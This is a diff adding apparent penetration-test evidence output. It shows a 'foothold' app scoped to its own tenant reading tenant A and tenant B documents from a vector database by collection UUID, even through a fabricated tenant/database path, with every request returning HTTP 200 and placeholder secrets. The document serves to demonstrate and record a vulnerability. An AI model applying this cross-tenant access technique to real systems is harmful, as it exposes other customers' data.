@@ -1,0 +1,19 @@
+=== the foothold app only knows ITS OWN tenant/database (default_tenant/default_database) ===
+It was never given tenant_a, tenant_b, db_a, db_b, or any collection ID for them.
+Collection UUIDs used below are used here to reproduce the vectordb/ finding
+(evidence/chroma/09-, 10- there) across containers; a real attacker would need
+to obtain the UUID by some other means (logging leak, cache, IDOR) - this step
+demonstrates that ONCE the UUID is known, tenant scoping does not matter, exactly
+as already established in vectordb/FINDINGS.md.
+
+=== reading TENANT A data through the FOOTHOLD APP OWN tenant/database path ===
+HTTP status: 200
+{"ids":["doc-a-1"],"embeddings":null,"documents":["LATERAL_TENANT_A_SECRET_VALUE_71bd2f"],"uris":null,"metadatas":[null],"include":["documents","metadatas"]}
+
+=== reading TENANT B data through the FOOTHOLD APP OWN tenant/database path ===
+HTTP status: 200
+{"ids":["doc-b-1"],"embeddings":null,"documents":["LATERAL_TENANT_B_SECRET_VALUE_ae930c"],"uris":null,"metadatas":[null],"include":["documents","metadatas"]}
+
+=== reading TENANT B data through a COMPLETELY FABRICATED tenant/database path ===
+HTTP status: 200
+{"ids":["doc-b-1"],"embeddings":null,"documents":["LATERAL_TENANT_B_SECRET_VALUE_ae930c"],"uris":null,"metadatas":[null],"include":["documents","metadatas"]}
